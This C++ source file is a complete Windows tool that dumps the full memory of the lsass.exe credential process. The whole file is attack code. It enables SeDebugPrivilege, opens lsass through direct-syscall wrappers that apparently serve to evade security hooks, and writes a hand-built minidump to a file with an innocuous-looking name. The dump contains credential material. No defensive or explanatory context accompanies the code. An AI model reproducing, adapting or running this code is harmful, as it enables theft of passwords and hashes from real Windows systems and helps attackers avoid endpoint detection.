#include <iostream>
#include "syscallsnative.h"
#include <Psapi.h>
#include "DebugHelper.h"
#include <vector>
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "Version.lib")


DWORD GetProcessIdByName(const std::wstring& processName) {
	DWORD processIds[1024], bytesReturned;
	if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
		std::cerr << "Failed to enumerate processes. Error: " << GetLastError() << std::endl;
		return 0;
	}

	DWORD processCount = bytesReturned / sizeof(DWORD);

	for (DWORD i = 0; i < processCount; ++i) {
		if (processIds[i] == 0) continue;

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
		if (hProcess) {
			WCHAR processNameBuffer[MAX_PATH];
			if (GetModuleFileNameEx(hProcess, NULL, processNameBuffer, MAX_PATH)) {
				std::wstring currentProcessName(processNameBuffer);
				if (currentProcessName.find(processName) != std::wstring::npos) {
					CloseHandle(hProcess);
					return processIds[i];
				}
			}
			CloseHandle(hProcess);
		}
	}

	std::cerr << "Process not found." << std::endl;
	return 0;
}

void watfile(struct dump_context* dc, RVA rva, const void* data, unsigned size)
{

	DWORD written;
	SetFilePointer(dc->hFile, rva, NULL, FILE_BEGIN);
	WriteFile(dc->hFile, data, size, &written, NULL);
}

void append(struct dump_context* dc, const void* data, unsigned size)
{
	
	watfile(dc, dc->rva, data, size);
	dc->rva += size;
}
unsigned dumpsysinfo(struct dump_context* dc)
{
	MINIDUMP_SYSTEM_INFO        mdSysInfo;
	SYSTEM_INFO                 sysInfo;
	OSVERSIONINFOW              osInfo;
	DWORD                       written;
	ULONG                       slen;
	DWORD                       wine_extra = 0;

	const char* build_id = NULL;
	const char* sys_name = NULL;
	const char* release_name = NULL;

	GetSystemInfo(&sysInfo);
	osInfo.dwOSVersionInfoSize = sizeof(osInfo);

	typedef int(WINAPI* RtlGetNtVersionNumbers)(PDWORD, PDWORD, PDWORD);

	HINSTANCE hinst = LoadLibrary(L"ntdll.dll");
	DWORD dwMajor, dwMinor, dwBuildNumber;
	RtlGetNtVersionNumbers proc = (RtlGetNtVersionNumbers)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
	proc(&dwMajor, &dwMinor, &dwBuildNumber);
	dwBuildNumber &= 0xffff;
	printf("OS Version: %d.%d.%d\n", dwMajor, dwMinor, dwBuildNumber);
	FreeLibrary(hinst);

	mdSysInfo.ProcessorArchitecture = sysInfo.wProcessorArchitecture;
	mdSysInfo.ProcessorLevel = sysInfo.wProcessorLevel;
	mdSysInfo.ProcessorRevision = sysInfo.wProcessorRevision;
	mdSysInfo.NumberOfProcessors = (UCHAR)sysInfo.dwNumberOfProcessors;
	mdSysInfo.ProductType = VER_NT_WORKSTATION;
	mdSysInfo.MajorVersion = dwMajor;
	mdSysInfo.MinorVersion = dwMinor;
	mdSysInfo.BuildNumber = dwBuildNumber;
	mdSysInfo.PlatformId = 0x2;

	mdSysInfo.CSDVersionRva = dc->rva + sizeof(mdSysInfo) + wine_extra;
	mdSysInfo.Reserved1 = 0;
	mdSysInfo.SuiteMask = VER_SUITE_TERMINAL;

	unsigned        i;
	ULONG64         one = 1;

	mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] = 0;
	mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[1] = 0;

	for (i = 0; i < sizeof(mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0]) * 8; i++)
		if (IsProcessorFeaturePresent(i))
			mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] |= one << i;

	append(dc, &mdSysInfo, sizeof(mdSysInfo));

	const WCHAR* szCSDVersion = L"";
	slen = lstrlenW(szCSDVersion) * sizeof(WCHAR);
	WriteFile(dc->hFile, &slen, sizeof(slen), &written, NULL);
	WriteFile(dc->hFile, szCSDVersion, slen, &written, NULL);
	dc->rva += sizeof(ULONG) + slen;

	return sizeof(mdSysInfo);
}
BOOL p_info(struct dump_context* dc)
{
	ULONG       buf_size = 0x1000;
	NTSTATUS    nts;
	SYSTEM_PROCESS_INFORMATION* pcs_buffer;

	if (!(pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)HeapAlloc(GetProcessHeap(), 0, buf_size)))
		return FALSE;

	for (;;)
	{
		nts = Sw3NtQuerySystemInformation(SystemProcessInformation, pcs_buffer, buf_size, NULL);
		if (nts != 0xC0000004L)
			break;

		pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)HeapReAlloc(GetProcessHeap(), 0, pcs_buffer, buf_size *= 2);
		if (!pcs_buffer)
			return FALSE;
	}

	if (nts == 0)
	{
		SYSTEM_PROCESS_INFORMATION* spi = pcs_buffer;

		for (;;)
		{
			if (HandleToUlong(spi->UniqueProcessId) == dc->pid)
			{
				dc->num_threads = spi->NumberOfThreads;
				dc->threads = (dump_thread*)HeapAlloc(GetProcessHeap(), 0, dc->num_threads * sizeof(dc->threads[0]));
				if (!dc->threads)
					goto failed;

				HeapFree(GetProcessHeap(), 0, pcs_buffer);
				return TRUE;
			}

			if (!spi->NextEntryOffset)
				break;

			spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
		}
	}

failed:
	HeapFree(GetProcessHeap(), 0, pcs_buffer);
	return FALSE;
}


void minidump_add_memory_block(struct dump_context* dc, ULONG64 base, ULONG size, ULONG rva)
{
	if (!dc->mem)
	{
		dc->alloc_mem = 32;
		dc->mem = (dump_memory*)HeapAlloc(GetProcessHeap(), 0, dc->alloc_mem * sizeof(*dc->mem));
	}
	else if (dc->num_mem >= dc->alloc_mem)
	{
		dc->alloc_mem *= 2;
		dc->mem = (dump_memory*)HeapReAlloc(GetProcessHeap(), 0, dc->mem, dc->alloc_mem * sizeof(*dc->mem));
	}
	if (dc->mem)
	{
		dc->mem[dc->num_mem].base = base;
		dc->mem[dc->num_mem].size = size;
		dc->mem[dc->num_mem].rva = rva;
		dc->num_mem++;
	}
	else
		dc->num_mem = dc->alloc_mem = 0;
}

void minidump_add_memory64_block(struct dump_context* dc, ULONG64 base, ULONG64 size)
{
	if (!dc->mem64)
	{
		dc->alloc_mem64 = 32;
		dc->mem64 = (dump_memory64*)HeapAlloc(GetProcessHeap(), 0, dc->alloc_mem64 * sizeof(*dc->mem64));
	}
	else if (dc->num_mem64 >= dc->alloc_mem64)
	{
		dc->alloc_mem64 *= 2;
		dc->mem64 = (dump_memory64*)HeapReAlloc(GetProcessHeap(), 0, dc->mem64, dc->alloc_mem64 * sizeof(*dc->mem64));
	}
	if (dc->mem64)
	{
		dc->mem64[dc->num_mem64].base = base;
		dc->mem64[dc->num_mem64].size = size;
		dc->num_mem64++;
	}
	else
		dc->num_mem64 = dc->alloc_mem64 = 0;
}

void fetchmem64(struct dump_context* dc)
{
	ULONG_PTR                   addr;
	MEMORY_BASIC_INFORMATION    mbi;

	addr = 0;
	while (VirtualQueryEx(dc->handle, (LPCVOID)addr, &mbi, sizeof(mbi)) != 0)
	{

		if (mbi.State == MEM_COMMIT)
			minidump_add_memory64_block(dc, (ULONG_PTR)mbi.BaseAddress, mbi.RegionSize);

		if ((addr + mbi.RegionSize) < addr)
			break;

		addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
	}
}

BOOL read_process_memory(HANDLE process, UINT64 addr, void* buf, size_t size)
{
	SIZE_T read = 0;
	NTSTATUS res = Sw3NtReadVirtualMemory(process, (PVOID*)addr, buf, size, &read);
	return !res;
}

unsigned dumpmem64(struct dump_context* dc)
{
	MINIDUMP_MEMORY64_LIST          mdMem64List;
	MINIDUMP_MEMORY_DESCRIPTOR64    mdMem64;
	DWORD                           written;
	unsigned                        i, len, sz;
	RVA                             rva_base;
	char                            tmp[1024];
	ULONG64                         pos;
	LARGE_INTEGER                   filepos;

	sz = sizeof(mdMem64List.NumberOfMemoryRanges) + sizeof(mdMem64List.BaseRva) + dc->num_mem64 * sizeof(mdMem64);

	mdMem64List.NumberOfMemoryRanges = dc->num_mem64;
	mdMem64List.BaseRva = dc->rva + sz;

	append(dc, &mdMem64List.NumberOfMemoryRanges, sizeof(mdMem64List.NumberOfMemoryRanges));
	append(dc, &mdMem64List.BaseRva, sizeof(mdMem64List.BaseRva));

	rva_base = dc->rva;
	dc->rva += dc->num_mem64 * sizeof(mdMem64);


	filepos.QuadPart = dc->rva;
	for (i = 0; i < dc->num_mem64; i++)
	{
		mdMem64.StartOfMemoryRange = dc->mem64[i].base;
		mdMem64.DataSize = dc->mem64[i].size;
		SetFilePointerEx(dc->hFile, filepos, NULL, FILE_BEGIN);
		for (pos = 0; pos < dc->mem64[i].size; pos += sizeof(tmp))
		{
			len = (unsigned)(min(dc->mem64[i].size - pos, sizeof(tmp)));
			if (read_process_memory(dc->handle, dc->mem64[i].base + pos, tmp, len))
				WriteFile(dc->hFile, tmp, len, &written, NULL);
		}
		filepos.QuadPart += mdMem64.DataSize;
		watfile(dc, rva_base + i * sizeof(mdMem64), &mdMem64, sizeof(mdMem64));
	}

	return sz;
}

void versioninfo(LPCWSTR filename, VS_FIXEDFILEINFO* ffi)
{
	DWORD       handle;
	DWORD       sz;
	static const WCHAR backslashW[] = { '\\', '\0' };

	memset(ffi, 0, sizeof(*ffi));
	if ((sz = GetFileVersionInfoSizeW(filename, &handle)))
	{
		void* info = HeapAlloc(GetProcessHeap(), 0, sz);
		if (info && GetFileVersionInfoW(filename, handle, sz, info))
		{
			VS_FIXEDFILEINFO* ptr;
			UINT    len;

			if (VerQueryValueW(info, backslashW, (LPVOID*)&ptr, &len))
				memcpy(ffi, ptr, min(len, sizeof(*ffi)));
		}
		HeapFree(GetProcessHeap(), 0, info);
	}
}

unsigned dump_modules(struct dump_context* dc, BOOL dump_elf)
{
	MINIDUMP_MODULE             mdModule;
	MINIDUMP_MODULE_LIST        mdModuleList;
	char                        tmp[1024];
	MINIDUMP_STRING* ms = (MINIDUMP_STRING*)tmp;
	ULONG                       i, nmod;
	RVA                         rva_base;
	DWORD                       flags_out;
	unsigned                    sz;

	for (i = nmod = 0; i < dc->num_modules; i++)
	{
		if ((dc->modules[i].is_elf && dump_elf) ||
			(!dc->modules[i].is_elf && !dump_elf))
			nmod++;
	}

	mdModuleList.NumberOfModules = 0;
	rva_base = dc->rva;
	dc->rva += sz = sizeof(mdModuleList.NumberOfModules) + sizeof(mdModule) * nmod;

	for (i = 0; i < dc->num_modules; i++)
	{
		if ((dc->modules[i].is_elf && !dump_elf) ||
			(!dc->modules[i].is_elf && dump_elf))
			continue;

		flags_out = ModuleWriteModule | ModuleWriteMiscRecord | ModuleWriteCvRecord;
		if (dc->type & MiniDumpWithDataSegs)
			flags_out |= ModuleWriteDataSeg;
		if (dc->type & MiniDumpWithProcessThreadData)
			flags_out |= ModuleWriteTlsData;
		if (dc->type & MiniDumpWithCodeSegs)
			flags_out |= ModuleWriteCodeSegs;

		ms->Length = (lstrlenW(dc->modules[i].name) + 1) * sizeof(WCHAR);

		lstrcpyW(ms->Buffer, dc->modules[i].name);

		if (flags_out & ModuleWriteModule)
		{
			mdModule.BaseOfImage = dc->modules[i].base;
			mdModule.SizeOfImage = dc->modules[i].size;
			mdModule.CheckSum = dc->modules[i].checksum;
			mdModule.TimeDateStamp = dc->modules[i].timestamp;
			mdModule.ModuleNameRva = dc->rva;
			ms->Length -= sizeof(WCHAR);
			append(dc, ms, sizeof(ULONG) + ms->Length + sizeof(WCHAR));
			versioninfo(ms->Buffer, &mdModule.VersionInfo);
			mdModule.CvRecord.DataSize = 0;
			mdModule.CvRecord.Rva = 0;
			mdModule.MiscRecord.DataSize = 0;
			mdModule.MiscRecord.Rva = 0;
			mdModule.Reserved0 = 0;
			mdModule.Reserved1 = 0;
			watfile(dc,
				rva_base + sizeof(mdModuleList.NumberOfModules) +
				mdModuleList.NumberOfModules++ * sizeof(mdModule),
				&mdModule, sizeof(mdModule));
		}
	}
	watfile(dc, rva_base, &mdModuleList.NumberOfModules, sizeof(mdModuleList.NumberOfModules));

	return sz;
}

BOOL validate_addr64(DWORD64 addr)
{
	if (sizeof(void*) == sizeof(int) && (addr >> 32))
	{
		SetLastError(ERROR_INVALID_PARAMETER);
		return FALSE;
	}
	return TRUE;
}

BOOL pe_load_nt_header(HANDLE hProc, DWORD64 base, IMAGE_NT_HEADERS* nth)
{
	IMAGE_DOS_HEADER    dos;


	NTSTATUS res = Sw3NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)base, &dos, sizeof(dos), NULL);
	NTSTATUS res2 = Sw3NtReadVirtualMemory(hProc, (PVOID*)(DWORD_PTR)(base + dos.e_lfanew), nth, sizeof(*nth), NULL);

	return  !res && dos.e_magic == IMAGE_DOS_SIGNATURE && !res2 && nth->Signature == IMAGE_NT_SIGNATURE;
}

BOOL add_module(struct dump_context* dc, const WCHAR* name, DWORD64 base, DWORD size, DWORD timestamp, DWORD checksum, BOOL is_elf)
{
	if (!dc->modules)
	{
		dc->alloc_modules = 32;
		dc->modules = (dump_module*)HeapAlloc(GetProcessHeap(), 0, dc->alloc_modules * sizeof(*dc->modules));
	}
	else if (dc->num_modules >= dc->alloc_modules)
	{
		dc->alloc_modules *= 2;
		dc->modules = (dump_module*)HeapReAlloc(GetProcessHeap(), 0, dc->modules, dc->alloc_modules * sizeof(*dc->modules));
	}
	if (!dc->modules)
	{
		dc->alloc_modules = dc->num_modules = 0;
		return FALSE;
	}

	GetModuleFileNameExW(dc->handle, (HMODULE)(DWORD_PTR)base, dc->modules[dc->num_modules].name, ARRAY_SIZE(dc->modules[dc->num_modules].name));

	dc->modules[dc->num_modules].base = base;
	dc->modules[dc->num_modules].size = size;
	dc->modules[dc->num_modules].timestamp = timestamp;
	dc->modules[dc->num_modules].checksum = checksum;
	dc->modules[dc->num_modules].is_elf = is_elf;
	dc->num_modules++;

	return TRUE;
}

BOOL fetch_pe_module_info_cb(PCWSTR name, DWORD64 base, ULONG size, PVOID user)
{
	struct dump_context* dc = (dump_context*)user;
	IMAGE_NT_HEADERS            nth;

	if (!validate_addr64(base))
		return FALSE;

	if (pe_load_nt_header(dc->handle, base, &nth))
		add_module((dump_context*)user, name, base, size, nth.FileHeader.TimeDateStamp, nth.OptionalHeader.CheckSum, FALSE);

	return TRUE;
}

void fetch_modules_info(struct dump_context* dc)
{
	EnumerateLoadedModulesW64(dc->handle, fetch_pe_module_info_cb, dc);
}

BOOL mdwdA(HANDLE hProcess, DWORD pid, HANDLE hFile)
{
	static const MINIDUMP_DIRECTORY emptyDir = { UnusedStream, {0, 0} };
	MINIDUMP_HEADER     mdHead;
	MINIDUMP_DIRECTORY  mdDir;
	DWORD               i, nStreams, idx_stream;
	struct dump_context dc;
	BOOL                sym_initialized = FALSE;

	const DWORD Flags = MiniDumpWithFullMemory |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithUnloadedModules;

	MINIDUMP_TYPE DumpType = (MINIDUMP_TYPE)Flags;

	if (!(sym_initialized = SymInitializeW(hProcess, NULL, TRUE)))
	{
		DWORD err = GetLastError();
		return FALSE;
	}

	dc.hFile = hFile;
	dc.pid = pid;
	dc.handle = hProcess;
	dc.modules = NULL;
	dc.num_modules = 0;
	dc.alloc_modules = 0;
	dc.threads = NULL;
	dc.num_threads = 0;
	dc.type = DumpType;
	dc.mem = NULL;
	dc.num_mem = 0;
	dc.alloc_mem = 0;
	dc.mem64 = NULL;
	dc.num_mem64 = 0;
	dc.alloc_mem64 = 0;
	dc.rva = 0;

	if (!p_info(&dc))
		return FALSE;

	fetch_modules_info(&dc);

	nStreams = 3;
	nStreams = (nStreams + 3) & ~3;

	// Write Header
	mdHead.Signature = MINIDUMP_SIGNATURE;
	mdHead.Version = MINIDUMP_VERSION;
	mdHead.NumberOfStreams = nStreams;
	mdHead.CheckSum = 0;
	mdHead.StreamDirectoryRva = sizeof(mdHead);
	mdHead.Flags = DumpType;
	append(&dc, &mdHead, sizeof(mdHead));


	dc.rva += nStreams * sizeof(mdDir);
	idx_stream = 0;

	mdDir.StreamType = SystemInfoStream;
	mdDir.Location.Rva = dc.rva;
	mdDir.Location.DataSize = dumpsysinfo(&dc);
	watfile(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir), &mdDir, sizeof(mdDir));

	mdDir.StreamType = ModuleListStream;
	mdDir.Location.Rva = dc.rva;
	mdDir.Location.DataSize = dump_modules(&dc, FALSE);
	watfile(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir), &mdDir, sizeof(mdDir));

	fetchmem64(&dc);

	mdDir.StreamType = Memory64ListStream;
	mdDir.Location.Rva = dc.rva;
	mdDir.Location.DataSize = dumpmem64(&dc);
	watfile(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir), &mdDir, sizeof(mdDir));

	for (i = idx_stream; i < nStreams; i++)
		watfile(&dc, mdHead.StreamDirectoryRva + i * sizeof(emptyDir), &emptyDir, sizeof(emptyDir));

	if (sym_initialized)
		SymCleanup(hProcess);

	HeapFree(GetProcessHeap(), 0, dc.mem);
	HeapFree(GetProcessHeap(), 0, dc.mem64);
	HeapFree(GetProcessHeap(), 0, dc.modules);
	HeapFree(GetProcessHeap(), 0, dc.threads);

	return TRUE;
}

void EnableDebugPriv()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tkp = { 0 };
	NTSTATUS status = Sw3NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (status != STATUS_SUCCESS)
	{
		printf("Failed to open process token.\n");
		return;
	}
	std::cout << "[+] NtOpenProcessToken result: " << status << std::endl;

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	LPCWSTR lpwPriv = L"SeDebugPrivilege";
	if (!LookupPrivilegeValueW(NULL, lpwPriv, &tkp.Privileges[0].Luid))
	{
		CloseHandle(hToken);
		return;
	}

	status = Sw3NtAdjustPrivilegesToken(hToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (status != STATUS_SUCCESS)
		printf("Failed to adjust process token.\n");

	std::cout << "[+] NtAdjustPrivilegesToken result: " << status << std::endl;
	CloseHandle(hToken);
}



bool syscallsNative()
{
	DWORD pid = GetProcessIdByName(L"lsass.exe");
	LPCSTR output_file = "C:\\Users\\Public\\panda.sense";

	EnableDebugPriv();

	HANDLE hProc;
	OBJECT_ATTRIBUTES object;
	NTSTATUS status = 0;
	HANDLE sectionHandle = NULL;
	LARGE_INTEGER sectionSize = { 450 };

	object.Length = sizeof(OBJECT_ATTRIBUTES);
	object.ObjectName = NULL;
	object.Attributes = NULL;
	object.RootDirectory = NULL;
	object.SecurityDescriptor = NULL;

	CLIENT_ID clientID = { (HANDLE)pid, NULL };


	status = Sw3NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object, &clientID);
	std::cout << "[+] NtOpenProcess result: " << status << std::endl;


	const DWORD Flags = MiniDumpWithFullMemory |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules |
		MiniDumpWithThreadInfo;

	HANDLE hFile = CreateFileA(output_file, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hFile)
	{
		printf("Failed to write dump: Invalid dump file path.\n");
		return false;
	}

	BOOL Result = mdwdA(hProc, pid, hFile);

	CloseHandle(hFile);

	if (!Result)
	{
		printf("Looks like an error: MiniDumpWriteDump failed.\n");
		return false;
	}
	else {

		printf("Done! Enjoy Dump.(%s)\n", output_file);
		return true;
	}


	CloseHandle(hProc);

	return true;

}
